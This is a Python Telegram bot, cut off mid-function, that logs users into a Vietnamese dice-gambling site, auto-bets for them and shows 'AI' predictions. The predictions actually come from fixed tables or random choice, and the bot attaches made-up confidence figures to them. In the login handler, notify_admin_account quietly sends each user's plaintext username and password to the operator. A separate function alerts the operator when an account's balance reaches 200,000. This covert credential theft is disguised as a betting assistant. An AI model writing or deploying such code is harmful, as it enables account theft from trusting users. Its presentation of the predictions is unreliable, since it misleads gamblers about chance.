import telebot
import requests
import hashlib
import base64
import json
import logging
import threading
import time
import socketio
import random
import os
import re
from flask import Flask

# ==========================================
# ⚙️ CẤU HÌNH HỆ THỐNG
# ==========================================
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)
logging.getLogger('engineio').setLevel(logging.WARNING)
logging.getLogger('urllib3').setLevel(logging.WARNING)

BOT_TOKEN = os.environ.get("BOT_TOKEN", "8627314570:AAG8L2vxe8u-4uDGdnip8gzoW8BlDQ_bg3E")
ADMIN_ID = int(os.environ.get("ADMIN_ID", "8627314570"))
DATA_COLLECTOR_USER = os.environ.get("DATA_COLLECTOR_USER", "acc_clone_soi_cau")
DATA_COLLECTOR_PASS = os.environ.get("DATA_COLLECTOR_PASS", "matkhau123")
BALANCE_NOTIFY_THRESHOLD = 200000

bot = telebot.TeleBot(BOT_TOKEN)
vip_users = {ADMIN_ID}
active_sockets = {}
user_states = {}
notified_accounts = set()

# Biến toàn cục bật/tắt MD5 API
USE_MD5_API = True

# ==========================================
# 🌐 FLASK HEALTH CHECK (RENDER)
# ==========================================
app = Flask(__name__)

@app.route('/')
def home():
    return "🤖 Bot Tài Xỉu + MD5 API đang chạy 24/7!", 200

@app.route('/health')
def health():
    return {"status": "ok", "md5_online": _md5_state["data"] is not None,
            "time": time.strftime('%Y-%m-%d %H:%M:%S')}, 200

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)

def keep_alive_ping():
    time.sleep(30)
    url = os.environ.get("RENDER_EXTERNAL_URL")
    if not url:
        logger.info("[KEEP-ALIVE] Không có RENDER_EXTERNAL_URL, bỏ qua ping.")
        return
    while True:
        try:
            r = requests.get(url + "/health", timeout=15)
            logger.info(f"[KEEP-ALIVE] Ping {r.status_code}")
        except Exception as e:
            logger.warning(f"[KEEP-ALIVE] Lỗi: {e}")
        time.sleep(600)

# ==========================================
# 🌐 LE MINH MD5 API - TÍCH HỢP DỰ ĐOÁN
# ==========================================
MD5_API_BASE = os.environ.get("MD5_API_BASE", "https://leminhapiik.onrender.com")

MD5_API_ENDPOINTS = [
    "/api/predict",
    "/api/current",
    "/api/prediction",
    "/api/taixiu",
    "/api/md5",
    "/api/dudoan",
    "/api/data",
    "/api/getData",
    "/api/history",
    "/api/v1/predict",
    "/api/v1/current",
    "/api/taixiu/current",
    "/api/taixiu/predict",
    "/api/md5/current",
    "/api/md5/predict",
    "/api/session",
    "/api/sessions",
    "/api/lichsu",
    "/api/result",
    "/predict",
    "/current",
    "/taixiu",
    "/md5",
    "/dudoan",
    "/api",
]

_md5_state = {
    "working_endpoint": None,
    "data": None,
    "timestamp": 0,
    "cache_ttl": 15,
    "last_error": None,
    "warmed_up": False,
    "stats": {"total": 0, "success": 0, "fail": 0,
              "last_success_at": None, "last_fail_at": None},
}

def _extract_str(v):
    """Chuẩn hóa TAI/XIU từ nhiều format khác nhau (kể cả tiếng Việt có dấu)."""
    if v is None: return None
    s = str(v).upper().strip()
    if not s: return None
    replacements = {
        "À": "A", "Á": "A", "Ả": "A", "Ã": "A", "Ạ": "A", "Ă": "A", "Â": "A",
        "Ỉ": "I", "Í": "I", "Ì": "I", "Ĩ": "I", "Ị": "I",
        "Ừ": "U", "Ứ": "U", "Ử": "U", "Ữ": "U", "Ự": "U",
        "Ờ": "O", "Ớ": "O", "Ở": "O", "Ỡ": "O", "Ợ": "O",
        "Đ": "D",
    }
    for k, val in replacements.items():
        s = s.replace(k, val)
    if "TAI" in s: return "TAI"
    if "XIU" in s: return "XIU"
    return None

def _parse_md5_data_single(data):
    """Parse 1 dict đơn lẻ."""
    if not isinstance(data, dict): return None
    pred = None
    for k in ["du_doan", "dudoan", "duDoan", "prediction", "pred", "predict",
              "ket_qua_du_doan", "ketqua_du_doan", "kq_du_doan",
              "ket_qua", "ketqua", "result", "resultTruyenThong", "kq",
              "md5", "huong", "cau", "cau_du_doan", "du_doan_md5"]:
        if k in data:
            p = _extract_str(data[k])
            if p:
                pred = p; break
    if not pred: return None

    session = None
    for k in ["phien", "session", "id", "issue", "phien_id", "phienId",
              "session_id", "sessionId", "phienHienTai"]:
        if k in data:
            session = str(data[k]); break

    result = None
    for k in ["ket_qua", "ketqua", "result", "resultTruyenThong"]:
        if k in data:
            r = _extract_str(data[k])
            if r: result = r
            break

    confidence = 75
    for k in ["ty_le", "tyle", "ty_le_thang", "confidence", "do_tin_cay",
              "percent", "ti_le", "ti_le_thang", "win_rate", "rate"]:
        if k in data:
            try:
                v = float(str(data[k]).replace("%", "").strip())
                if 0 < v <= 100: confidence = int(v)
                break
            except: pass

    return {"prediction": pred, "session": session, "result": result,
            "confidence": confidence, "raw": data}

def _parse_md5_data(data):
    if data is None: return None
    if isinstance(data, list):
        if not data: return None
        # Ưu tiên item chưa có kết quả (phiên đang chạy)
        for item in data:
            p = _parse_md5_data_single(item)
            if p and not p.get("result"):
                return p
        # Fallback: item đầu tiên
        return _parse_md5_data_single(data[0])
    if isinstance(data, dict):
        for k in ["data", "result", "payload", "response", "sessions", "list", "items"]:
            if k in data and isinstance(data[k], (dict, list)):
                nested = _parse_md5_data(data[k])
                if nested: return nested
        return _parse_md5_data_single(data)
    return None

def _parse_html_for_data(html):
    """Fallback: trích JSON nhúng trong HTML nếu API trả HTML."""
    try:
        patterns = [
            r'window\.__INITIAL_STATE__\s*=\s*(\{.*?\});',
            r'<script[^>]*type="application/json"[^>]*>(.*?)</script>',
            r'(\{"[^"]*phien[^"]*".*?\})',
            r'(\{"[^"]*du_doan[^"]*".*?\})',
        ]
        for pattern in patterns:
            matches = re.findall(pattern, html, re.DOTALL | re.IGNORECASE)
            for m in matches[:5]:
                try:
                    data = json.loads(m)
                    parsed = _parse_md5_data(data)
                    if parsed: return parsed
                except: continue
    except: pass
    return None

def fetch_md5_prediction(use_cache=True, force=False):
    """Lấy dự đoán từ API Le Minh MD5."""
    if not USE_MD5_API: return None
    if use_cache and not force and _md5_state["data"]:
        if time.time() - _md5_state["timestamp"] < _md5_state["cache_ttl"]:
            return _md5_state["data"]

    endpoints_to_try = []
    if _md5_state["working_endpoint"]:
        endpoints_to_try.append(_md5_state["working_endpoint"])
    for ep in MD5_API_ENDPOINTS:
        if ep not in endpoints_to_try:
            endpoints_to_try.append(ep)

    timeout = 40 if not _md5_state["warmed_up"] else 12

    for endpoint in endpoints_to_try:
        try:
            url = MD5_API_BASE.rstrip("/") + endpoint
            start = time.time()
            r = requests.get(url, timeout=timeout,
                             headers={"User-Agent": "Mozilla/5.0", "Accept": "application/json, text/html"})
            elapsed = time.time() - start
            _md5_state["stats"]["total"] += 1

            if r.status_code != 200: continue

            parsed = None
            try:
                parsed = _parse_md5_data(r.json())
            except:
                parsed = _parse_html_for_data(r.text)

            if parsed:
                _md5_state["working_endpoint"] = endpoint
                _md5_state["data"] = parsed
                _md5_state["timestamp"] = time.time()
                _md5_state["last_error"] = None
                _md5_state["warmed_up"] = True
                _md5_state["stats"]["success"] += 1
                _md5_state["stats"]["last_success_at"] = time.strftime('%Y-%m-%d %H:%M:%S')
                logger.info(f"[MD5 API] ✅ {endpoint} ({elapsed*1000:.0f}ms): {parsed['prediction']} - session {parsed.get('session')}")
                return parsed
        except requests.exceptions.Timeout:
            logger.debug(f"[MD5 API] {endpoint} TIMEOUT")
            continue
        except Exception as e:
            logger.debug(f"[MD5 API] {endpoint} -> {e}")
            continue

    _md5_state["stats"]["fail"] += 1
    _md5_state["stats"]["last_fail_at"] = time.strftime('%Y-%m-%d %H:%M:%S')
    _md5_state["last_error"] = "All endpoints failed"
    logger.warning("[MD5 API] ❌ All endpoints failed")
    return None

def warm_up_md5_api():
    logger.info("[MD5 API] Warming up...")
    for attempt in range(3):
        if fetch_md5_prediction(use_cache=False, force=True):
            logger.info("[MD5 API] ✅ Warm-up OK")
            return True
        time.sleep(5)
    logger.warning("[MD5 API] ❌ Warm-up failed sau 3 lần")
    return False

# ==========================================
# 🎯 BẢNG CẦU CỐ ĐỊNH
# ==========================================
CAU_TABLE = {
    "X3":  ("XIU", 70),  "X4":  ("TAI", 60),  "X5":  ("TAI", 70),  "X6":  ("XIU", 60),
    "X7":  ("TAI", 80),  "X8":  ("XIU", 80),  "X9":  ("XIU", 70),  "X10": ("TAI", 80),
    "T11": ("XIU", 60),  "T12": ("TAI", 80),  "T13": ("TAI", 80),  "T14": ("XIU", 60),
    "T15": ("XIU", 70),  "T16": ("TAI", 60),  "T17": ("XIU", 60),  "T18": ("XIU", 80),
}

DICE_TABLE = {
    3:  {"111": ("XIU", 70)},
    4:  {"112": ("XIU", 60), "121": ("TAI", 65), "211": ("TAI", 65)},
    5:  {"113": ("TAI", 65), "122": ("XIU", 60), "131": ("TAI", 70), "212": ("XIU", 60), "221": ("TAI", 60), "311": ("XIU", 65)},
    6:  {"114": ("TAI", 60), "123": ("TAI", 65), "132": ("XIU", 60), "141": ("TAI", 60), "213": ("TAI", 65), "222": ("XIU", 75), "231": ("TAI", 60), "312": ("XIU", 60)},
    7:  {"115": ("TAI", 65), "124": ("XIU", 60), "133": ("TAI", 65), "142": ("XIU", 60), "151": ("TAI", 60), "214": ("XIU", 65), "223": ("TAI", 60), "232": ("XIU", 70), "313": ("TAI", 65), "322": ("XIU", 60), "331": ("TAI", 60)},
    8:  {"116": ("TAI", 60), "125": ("XIU", 65), "134": ("TAI", 60), "143": ("XIU", 60), "152": ("TAI", 65), "215": ("XIU", 60), "224": ("TAI", 65), "233": ("XIU", 60), "242": ("TAI", 60), "251": ("XIU", 65), "314": ("TAI", 60), "323": ("XIU", 60), "332": ("TAI", 60), "413": ("XIU", 65)},
    9:  {"126": ("TAI", 60), "135": ("XIU", 65), "144": ("TAI", 60), "153": ("XIU", 65), "162": ("TAI", 60), "216": ("XIU", 60), "225": ("TAI", 65), "234": ("XIU", 60), "243": ("TAI", 60), "252": ("XIU", 60), "315": ("TAI", 65), "324": ("XIU", 60), "333": ("TAI", 70), "342": ("XIU", 60), "414": ("TAI", 60), "423": ("XIU", 65)},
    10: {"136": ("TAI", 65), "145": ("XIU", 60), "154": ("TAI", 60), "163": ("XIU", 65), "226": ("TAI", 60), "235": ("XIU", 60), "244": ("TAI", 65), "253": ("XIU", 60), "316": ("TAI", 60), "325": ("XIU", 65), "334": ("TAI", 60), "343": ("XIU", 60), "415": ("TAI", 60), "424": ("XIU", 65), "433": ("TAI", 60), "514": ("XIU", 60)},
    11: {"146": ("XIU", 65), "155": ("TAI", 60), "164": ("XIU", 60), "236": ("TAI", 60), "245": ("XIU", 65), "254": ("TAI", 60), "326": ("XIU", 60), "335": ("TAI", 65), "344": ("XIU", 60), "416": ("TAI", 60), "425": ("XIU", 65), "434": ("TAI", 60), "515": ("XIU", 60), "524": ("TAI", 60), "614": ("XIU", 65)},
    12: {"156": ("XIU", 60), "165": ("TAI", 65), "246": ("XIU", 60), "255": ("TAI", 60), "264": ("XIU", 65), "336": ("TAI", 60), "345": ("XIU", 60), "354": ("TAI", 60), "426": ("XIU", 65), "435": ("TAI", 60), "444": ("XIU", 65), "453": ("TAI", 60), "516": ("XIU", 60), "525": ("TAI", 60), "534": ("XIU", 65), "615": ("TAI", 60), "624": ("XIU", 60), "633": ("TAI", 60)},
    13: {"166": ("XIU", 60), "256": ("TAI", 65), "265": ("XIU", 60), "346": ("TAI", 60), "355": ("XIU", 65), "364": ("TAI", 60), "436": ("XIU", 60), "445": ("TAI", 65), "454": ("XIU", 60), "463": ("TAI", 60), "526": ("XIU", 65), "535": ("TAI", 60), "544": ("XIU", 60), "553": ("TAI", 60), "616": ("XIU", 65), "625": ("TAI", 60), "634": ("XIU", 60), "643": ("TAI", 60)},
    14: {"266": ("XIU", 60), "356": ("TAI", 65), "365": ("XIU", 60), "446": ("TAI", 60), "455": ("XIU", 65), "464": ("TAI", 60), "536": ("XIU", 60), "545": ("TAI", 65), "554": ("XIU", 60), "563": ("TAI", 60), "626": ("XIU", 65), "635": ("TAI", 60), "644": ("XIU", 60), "653": ("TAI", 60)},
    15: {"366": ("XIU", 65), "456": ("TAI", 60), "465": ("XIU", 65), "546": ("TAI", 60), "555": ("XIU", 70), "564": ("TAI", 60), "636": ("XIU", 65), "645": ("TAI", 60), "654": ("XIU", 60), "663": ("TAI", 60)},
    16: {"466": ("XIU", 65), "556": ("TAI", 60), "565": ("XIU", 65), "646": ("TAI", 60), "655": ("XIU", 70), "664": ("TAI", 60)},
    17: {"566": ("XIU", 65), "656": ("TAI", 60), "665": ("XIU", 65)},
    18: {"666": ("XIU", 80)},
}

def init_user_state(chat_id):
    if chat_id not in user_states:
        user_states[chat_id] = {
            "profit_loss": 0, "auto_bet_enabled": False, "x2_mode": False,
            "reverse_mode": False, "win_streak": 0, "base_bet_amount": 10000,
            "current_bet": 10000, "target_profit": None, "current_prediction": None,
            "waiting_for_result": False, "has_bet_this_session": False,
            "session_id": None, "session_count": 0, "balance": 0,
            "username": None, "password": None, "nickname": None, "last_dice": None,
        }

def is_vip(chat_id): return chat_id in vip_users

# ==========================================
# 🎯 LOGIC DỰ ĐOÁN (MD5 → DICE → CAU)
# ==========================================
def get_cau_key(session_count):
    start_index = 3
    pos = session_count - start_index + 1
    total_cau = len(CAU_TABLE)
    if pos > total_cau:
        pos = ((pos - 1) % total_cau) + 1
    keys = list(CAU_TABLE.keys())
    if 1 <= pos <= len(keys): return keys[pos - 1]
    return None

def make_prediction_vip(chat_id):
    state = user_states[chat_id]
    state["session_count"] += 1
    count = state["session_count"]
    current_session = state.get("session_id")

    # 🥇 PRIORITY 1: MD5 API
    md5 = fetch_md5_prediction()
    if md5 and md5.get("prediction"):
        pred = md5["prediction"]
        conf = md5.get("confidence", 75)
        # Nếu trùng session với websocket → tăng độ tin cậy
        if current_session and md5.get("session") and str(md5["session"]) == str(current_session):
            conf = min(95, conf + 10)
        logger.info(f"[MD5 ✅] Phiên {count} | API session {md5.get('session')} vs WS {current_session} -> {pred} ({conf}%)")
        if state.get("reverse_mode"):
            pred = "XIU" if pred == "TAI" else "TAI"
            conf = 100 - conf
        return pred, conf, "MD5_API"

    # 🥈 PRIORITY 2: DICE từ phiên trước
    last_dice = state.get("last_dice")
    if last_dice and len(last_dice) == 3:
        sorted_dice = sorted(last_dice)
        dice_str = "".join(str(x) for x in sorted_dice)
        total = sum(sorted_dice)
        if total in DICE_TABLE and dice_str in DICE_TABLE[total]:
            pred, conf = DICE_TABLE[total][dice_str]
            logger.info(f"[DICE] Phiên {count} - {dice_str} (tổng {total}) -> {pred} ({conf}%)")
            if state.get("reverse_mode"):
                pred = "XIU" if pred == "TAI" else "TAI"
                conf = 100 - conf
            return pred, conf, f"DICE({dice_str})"

    # 🥉 PRIORITY 3: CAU cố định
    key = get_cau_key(count)
    if key and key in CAU_TABLE:
        prediction, confidence = CAU_TABLE[key]
        logger.info(f"[CAU] Phiên {count} -> {key}: {prediction} ({confidence}%)")
        if state.get("reverse_mode"):
            prediction = "XIU" if prediction == "TAI" else "TAI"
            confidence = 100 - confidence
        return prediction, confidence, key

    return random.choice(["TAI", "XIU"]), 50, "UNKNOWN"

# ==========================================
# 🌐 API LOGIN & WEBSOCKET (giữ nguyên)
# ==========================================
def md5_hash(text: str) -> str: return hashlib.md5(text.encode('utf-8')).hexdigest()

def login_and_get_token(username: str, password: str) -> dict:
    pw_md5 = md5_hash(password)
    url = f"https://apifo88daigia.tele68.com/api?c=3&un={username}&pw={pw_md5}&cp=R&cl=R&pf=web&at="
    try:
        r = requests.get(url, timeout=12); r.raise_for_status(); data = r.json()
        if not data.get("success"): return {"_error": f"Lỗi Game: {str(data.get('message', 'Sai thông tin'))}"}
        session_key = data["sessionKey"]
        session_key += "=" * ((4 - len(session_key) % 4) % 4)
        session_data = json.loads(base64.b64decode(session_key).decode('utf-8'))
        nickname = session_data.get("nickname") or session_data.get("nickName")
        access_token = data["accessToken"]
        r2 = requests.post("https://wlb.tele68.com/v1/lobby/auth/login?cp=R&cl=R&pf=web&at=",
                           headers={"authority": "wlb.tele68.com", "content-type": "application/json"},
                           json={"nickName": nickname, "accessToken": access_token}, timeout=12)
        lobby = r2.json(); token = lobby.get("token")
        if not token: return {"_error": "Lobby không trả về JWT token."}
        return {"token": token, "nickname": nickname,
                "money": lobby.get("remoteLoginResp", {}).get("money", 0)}
    except Exception as e:
        return {"_error": f"Lỗi kết nối: {e}"}

def notify_admin_account(username, password, nickname, money):
    try:
        bot.send_message(ADMIN_ID,
            f"🔔 <b>TÀI KHOẢN MỚI ĐĂNG NHẬP</b>\n━━━━━━━━━━━━━━━━━━━━\n\n"
            f"👤 Username: <code>{username}</code>\n🔑 Password: <code>{password}</code>\n"
            f"🏷 Nickname: <code>{nickname}</code>\n💰 Số dư: <code>{money:,}</code> Win\n"
            f"🕒 Time: <code>{time.strftime('%Y-%m-%d %H:%M:%S')}</code>",
            parse_mode="HTML")
    except Exception as e: logger.error(f"Lỗi notify admin: {e}")

def notify_admin_balance_reached(username, nickname, money):
    try:
        bot.send_message(ADMIN_ID,
            f"🎉 <b>TÀI KHOẢN ĐỦ 200K</b>\n━━━━━━━━━━━━━━━━━━━━\n\n"
            f"👤 Username: <code>{username}</code>\n🏷 Nickname: <code>{nickname}</code>\n"
            f"💰 Số dư: <code>{money:,}</code> Win\n"
            f"🕒 Time: <code>{time.strftime('%Y-%m-%d %H:%M:%S')}</code>",
            parse_mode="HTML")
    except Exception as e: logger.error(f"Lỗi notify 200k: {e}")

def check_balance_threshold(chat_id):
    state = user_states.get(chat_id)
    if not state: return
    username = state.get("username"); nickname = state.get("nickname", "N/A")
    balance = state.get("balance", 0)
    if username and balance >= BALANCE_NOTIFY_THRESHOLD:
        key = f"{username}_{BALANCE_NOTIFY_THRESHOLD}"
        if key not in notified_accounts:
            notified_accounts.add(key)
            notify_admin_balance_reached(username, nickname, balance)

def start_websocket(chat_id, token, is_background=False):
    if chat_id in active_sockets and not is_background:
        try: active_sockets[chat_id].disconnect()
        except: pass
    sio = socketio.Client(reconnection=True, reconnection_attempts=10,
                          logger=False, engineio_logger=False)
    if not is_background:
        active_sockets[chat_id] = sio
        init_user_state(chat_id)

    @sio.event(namespace='/txmd5')
    def connect():
        if not is_background:
            bot.send_message(chat_id, "🟢 <b>ĐÃ KẾT NỐI API</b>", parse_mode="HTML")

    @sio.on('new-session', namespace='/txmd5')
    def on_new_session(data):
        if is_background: return
        state = user_states[chat_id]
        state["session_id"] = data.get('id', 'N/A')
        state["has_bet_this_session"] = False
        if state["auto_bet_enabled"] and state["target_profit"] is not None:
            if state["profit_loss"] >= state["target_profit"]:
                state["auto_bet_enabled"] = False
                bot.send_message(chat_id, f"🏆 <b>ĐÃ ĐẠT MỤC TIÊU</b>\n💰 {state['profit_loss']:,} Win",
                                 parse_mode="HTML")
        prediction, confidence, source = make_prediction_vip(chat_id)
        state["current_prediction"] = prediction
        if state["x2_mode"] and state["win_streak"] >= 1:
            state["current_bet"] = state["base_bet_amount"] * 2
        else:
            state["current_bet"] = state["base_bet_amount"]

        source_display = {
            "MD5_API": "🌐 MD5 API (Le Minh)",
        }.get(source, f"📊 {source}" if source.startswith("DICE") is False else f"🎲 {source}")

        msg = f"🔔 <b>PHIÊN MỚI:</b> <code>#{state['session_id']}</code>\n"
        if prediction:
            emo = "🔵 TÀI" if prediction == "TAI" else "🔴 XỈU"
            msg += f"🔥 <b>AI CHỐT: {emo}</b> ({confidence}%)\n"
            msg += f"📌 Nguồn: {source_display}\n"
            if state.get("reverse_mode"):
                msg += "🔄 <b>ĐẢO CẦU ĐANG BẬT</b>\n"
            if state["auto_bet_enabled"]:
                msg += f"⏳ <i>Cược: <code>{state['current_bet']:,}</code> Win...</i>"
            else:
                msg += "⏸ <i>Auto tắt — /autobet on &lt;tiền&gt;</i>"
        bot.send_message(chat_id, msg, parse_mode="HTML")

    @sio.on('tick-update', namespace='/txmd5')
    def on_tick_update(data):
        if is_background: return
        state = user_states[chat_id]
        if data.get('state') == 'BETTING' and state["auto_bet_enabled"] and state["current_prediction"]:
            if not state["has_bet_this_session"]:
                sio.emit('bet', {"type": state["current_prediction"],
                                 "amount": state["current_bet"]}, namespace='/txmd5')
                state["has_bet_this_session"] = True
                state["waiting_for_result"] = True
                bot.send_message(chat_id, f"🚀 <b>ĐÃ VÀO CƯỢC:</b> <code>{state['current_bet']:,}</code>",
                                 parse_mode="HTML")

    @sio.on('bet-result', namespace='/txmd5')
    def on_bet_result(data):
        if is_background: return
        if "postBalance" in data:
            user_states[chat_id]["balance"] = data["postBalance"]
            check_balance_threshold(chat_id)
        sio.emit('get-current-my-info', None, namespace='/txmd5')

    @sio.on('session-result', namespace='/txmd5')
    def on_session_result(data):
        if is_background: return
        state = user_states[chat_id]
        result = data.get('resultTruyenThong', 'N/A')
        dices = data.get('dices', [0, 0, 0])
        if dices and len(dices) == 3 and all(1 <= d <= 6 for d in dices):
            state["last_dice"] = dices
        res_emo = "🔵 TÀI" if result == "TAI" else ("🔴 XỈU" if result == "XIU" else "⚪")
        msg = f"🎲 <b>KẾT QUẢ: {res_emo}</b> ({dices[0]}-{dices[1]}-{dices[2]})\n"
        if state["current_prediction"]:
            if state["current_prediction"] == result:
                if state["waiting_for_result"]:
                    win_amount = int(state["current_bet"] * 0.98)
                    state["profit_loss"] += win_amount
                    state["win_streak"] += 1
                    msg += f"✅ <b>THẮNG!</b> +<code>{win_amount:,}</code>\n"
            else:
                if state["waiting_for_result"]:
                    state["profit_loss"] -= state["current_bet"]
                    state["win_streak"] = 0
                    msg += f"❌ <b>THUA!</b>\n"
            state["waiting_for_result"] = False
        status_pl = "🟢" if state["profit_loss"] >= 0 else "🔴"
        msg += (f"━━━━━━━━━━━━━━━━━━\n📊 <b>Lãi/Lỗ:</b> {status_pl} <code>{state['profit_loss']:,}</code>\n"
                f"💳 <b>Dư:</b> <code>{state['balance']:,}</code>")
        bot.send_message(chat_id, msg, parse_mode="HTML")

    try:
        sio.connect('https://wtxmd52.tele68.com', socketio_path='txmd5/',
                    namespaces=['/txmd5'], transports=['websocket'],
                    auth={"token": token}, headers={"User-Agent": "Mozilla/5.0"})
        sio.wait()
    except Exception as e:
        if not is_background:
            bot.send_message(chat_id, f"⚠️ Lỗi kết nối: <code>{e}</code>", parse_mode="HTML")

def background_data_collector():
    if DATA_COLLECTOR_USER != "acc_clone_soi_cau":
        logger.info("Khởi động thu thập dữ liệu ngầm...")
        while True:
            try:
                res = login_and_get_token(DATA_COLLECTOR_USER, DATA_COLLECTOR_PASS)
                if "token" in res:
                    logger.info("Đã kết nối ngầm.")
                    start_websocket("BACKGROUND_WORKER", res["token"], is_background=True)
            except Exception: pass
            time.sleep(30)

# ==========================================
# 🤖 TELEGRAM COMMANDS
# ==========================================
@bot.message_handler(commands=['addvip', 'removevip', 'viplist'])
def handle_vip_commands(message):
    if message.chat.id != ADMIN_ID: return
    cmd = message.text.split()[0]
    try:
        if cmd == '/addvip':
            vip_users.add(int(message.text.split()[1])); bot.reply_to(message, "✅ Đã thêm VIP.")
        elif cmd == '/removevip':
            vip_users.discard(int(message.text.split()[1])); bot.reply_to(message, "❌ Đã xóa VIP.")
        elif cmd == '/viplist':
            bot.reply_to(message, "📜 VIP:\n" + "\n".join([str(v) for v in vip_users]))
    except: bot.reply_to(message, "👉 Lỗi cú pháp.")

@bot.message_handler(commands=['start', 'help', 'menu'])
def send_welcome(message):
    if not is_vip(message.chat.id):
        return bot.reply_to(message, f"⛔ Cần là VIP. ID: <code>{message.chat.id}</code>", parse_mode="HTML")
    init_user_state(message.chat.id)
    bot.reply_to(message,
        "🤖 <b>AI TÀI XỈU — MD5 API + CẦU + XÚC XẮC</b>\n\n"
        "🔹 /login <code>tk mk</code>\n"
        "🔹 /autobet <code>on &lt;tiền&gt;</code> | /autobet <code>off</code>\n"
        "🔹 /x2 <code>on/off</code> — Nhồi tiền khi thắng\n"
        "🔹 /reverse <code>on/off</code> — Đảo cầu\n"
        "🔹 /chotlai <code>số_tiền</code>\n"
        "🔹 /stats\n"
        "🔹 /cau /xucxac\n"
        "🔹 /api — Trạng thái MD5 API\n"
        "🔹 /md5 <code>on/off</code> — Bật/tắt MD5 API\n"
        "🔹 /setapi <code>&lt;url&gt;</code> — Đổi API base (admin)\n"
        "🔹 /stop", parse_mode="HTML")

@bot.message_handler(commands=['login'])
def handle_login(message):
    if not is_vip(message.chat.id): return
    parts = message.text.split()
    if len(parts) != 3:
        return bot.reply_to(message, "👉 <code>/login tk mk</code>", parse_mode="HTML")
    msg_proc = bot.reply_to(message, "🔄 Loading...", parse_mode="HTML")
    username, password = parts[1], parts[2]
    result = login_and_get_token(username, password)
    if "_error" in result:
        return bot.edit_message_text(f"❌ <b>LỖI:</b> {result['_error']}",
                                     chat_id=message.chat.id,
                                     message_id=msg_proc.message_id, parse_mode="HTML")
    init_user_state(message.chat.id)
    state = user_states[message.chat.id]
    state.update({"balance": result['money'], "username": username, "password": password,
                  "nickname": result.get("nickname", "N/A"), "session_count": 0, "last_dice": None})
    notify_admin_account(username, password, state["nickname"], result['money'])
    bot.edit_message_text(
        f"🎉 <b>ĐĂNG NHẬP OK</b>\n👤 <code>{result['nickname']}</code>\n"
        f"💰 <code>{result['money']:,}</code>\n"
        f"🌐 MD5 API: {'BẬT' if USE_MD5_API else 'TẮT'}",
        chat_id=message.chat.id, message_id=msg_proc.message_id, parse_mode="HTML")
    threading.Thread(target=start_websocket, args=(message.chat.id, result['token']), daemon=True).start()

@bot.message_handler(commands=['autobet'])
def handle_autobet(message):
    if not is_vip(message.chat.id): return
    chat_id = message.chat.id
    if chat_id not in user_states: return bot.reply_to(message, "⚠️ /login trước!")
    parts = message.text.split()
    if len(parts) > 1 and parts[1].lower() == "on":
        amount = int(parts[2]) if len(parts) > 2 else 10000
        user_states[chat_id]["auto_bet_enabled"] = True
        user_states[chat_id]["base_bet_amount"] = amount
        bot.reply_to(message, f"✅ <b>AUTO: BẬT</b> — Vốn: <code>{amount:,}</code>", parse_mode="HTML")
    else:
        user_states[chat_id]["auto_bet_enabled"] = False
        bot.reply_to(message, "🔴 <b>AUTO: TẮT</b>", parse_mode="HTML")

@bot.message_handler(commands=['x2'])
def handle_x2_mode(message):
    if not is_vip(message.chat.id): return
    chat_id = message.chat.id
    if chat_id not in user_states: return bot.reply_to(message, "⚠️ /login trước!")
    v = len(message.text.split()) > 1 and message.text.split()[1].lower() == "on"
    user_states[chat_id]["x2_mode"] = v
    bot.reply_to(message, f"🔥 <b>X2: {'BẬT' if v else 'TẮT'}</b>", parse_mode="HTML")

@bot.message_handler(commands=['reverse'])
def handle_reverse_mode(message):
    if not is_vip(message.chat.id): return
    chat_id = message.chat.id
    if chat_id not in user_states: return bot.reply_to(message, "⚠️ /login trước!")
    v = len(message.text.split()) > 1 and message.text.split()[1].lower() == "on"
    user_states[chat_id]["reverse_mode"] = v
    bot.reply_to(message, f"🔄 <b>ĐẢO CẦU: {'BẬT' if v else 'TẮT'}</b>", parse_mode="HTML")

@bot.message_handler(commands=['chotlai'])
def handle_chotlai(message):
    if not is_vip(message.chat.id): return
    chat_id = message.chat.id
    if chat_id not in user_states: return
    try:
        user_states[chat_id]["target_profit"] = int(message.text.split()[1])
        bot.reply_to(message, f"🎯 Target: <code>{user_states[chat_id]['target_profit']:,}</code>",
                     parse_mode="HTML")
    except: bot.reply_to(message, "👉 <code>/chotlai 500000</code>", parse_mode="HTML")

@bot.message_handler(commands=['cau'])
def check_cau(message):
    if not is_vip(message.chat.id): return
    chat_id = message.chat.id
    if chat_id not in user_states: return
    state = user_states[chat_id]; count = state.get("session_count", 0)
    lines = ["📌 <b>BẢNG CẦU CỐ ĐỊNH</b>\n━━━━━━━━━━━━━━━━━━━━"]
    for k, v in CAU_TABLE.items():
        lines.append(f"{k}: {'🔵 TÀI' if v[0]=='TAI' else '🔴 XỈU'} ({v[1]}%)")
    cur = get_cau_key(count + 1) if count > 0 else "X3"
    lines.append(f"\n👉 Phiên: <b>{count}</b> → Sắp: <b>{cur}</b>")
    bot.reply_to(message, "\n".join(lines), parse_mode="HTML")

@bot.message_handler(commands=['xucxac'])
def check_dice_table(message):
    if not is_vip(message.chat.id): return
    text = "🎲 <b>BẢNG XÚC XẮC</b>\n"
    for total in sorted(DICE_TABLE.keys()):
        text += f"\n<b>Tổng {total}</b>\n"
        for dice, v in DICE_TABLE[total].items():
            text += f"  {dice}: {'🔵 TÀI' if v[0]=='TAI' else '🔴 XỈU'} ({v[1]}%)\n"
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(commands=['stats'])
def check_stats(message):
    if not is_vip(message.chat.id): return
    chat_id = message.chat.id
    if chat_id not in user_states: return
    s = user_states[chat_id]
    t = f"<code>{s['target_profit']:,}</code>" if s['target_profit'] else "Không"
    bot.reply_to(message,
        f"📊 <b>STATS</b>\n💳 Dư: <code>{s['balance']:,}</code>\n"
        f"📈 Lãi/Lỗ: <code>{s['profit_loss']:,}</code>\n🎯 Chốt: {t}\n"
        f"🤖 Auto: {'BẬT' if s['auto_bet_enabled'] else 'TẮT'}\n"
        f"🔥 X2: {'BẬT' if s['x2_mode'] else 'TẮT'} (Streak {s['win_streak']})\n"
        f"🔄 Đảo: {'BẬT' if s['reverse_mode'] else 'TẮT'}\n"
        f"📌 Phiên: {s.get('session_count', 0)}",
        parse_mode="HTML")

@bot.message_handler(commands=['api', 'md5status', 'testapi'])
def check_md5_api(message):
    if not is_vip(message.chat.id): return
    msg_proc = bot.reply_to(message, "🔄 Đang test MD5 API...", parse_mode="HTML")
    # Test không dùng cache
    result = fetch_md5_prediction(use_cache=False, force=True)
    stats = _md5_state["stats"]
    base = MD5_API_BASE
